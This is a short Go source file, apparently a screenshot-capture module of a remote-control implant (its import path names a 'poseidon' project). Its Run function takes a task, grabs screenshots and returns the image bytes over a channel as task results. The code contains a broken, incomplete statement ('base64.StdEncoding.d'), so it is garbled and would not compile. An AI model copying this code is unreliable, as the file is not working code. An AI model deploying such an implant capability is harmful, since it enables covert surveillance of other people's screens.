package screencapture

import (
	"encoding/base64"
	"github.com/xorrior/poseidon/pkg/utils/structs"
)

//ScreenShot - interface for holding screenshot data
type ScreenShot interface {
	Monitor() int
	Data() []byte
}

//Run - function used to obtain screenshots
func Run(task structs.Task, threadChannel chan<- structs.ThreadMsg) {
	tMsg := structs.ThreadMsg{}
	tMsg.Error = false
	result, err := getscreenshot()
	base64.StdEncoding.d
	tMsg.TaskItem = task
	if err != nil {
		tMsg.TaskResult = []byte(err.Error())
		tMsg.Error = true
		threadChannel <- tMsg
		return
	}

	for i := 0; i < len(result); i++ {
		tMsg.TaskResult = result[i].Data()
		threadChannel <- tMsg
	}
}
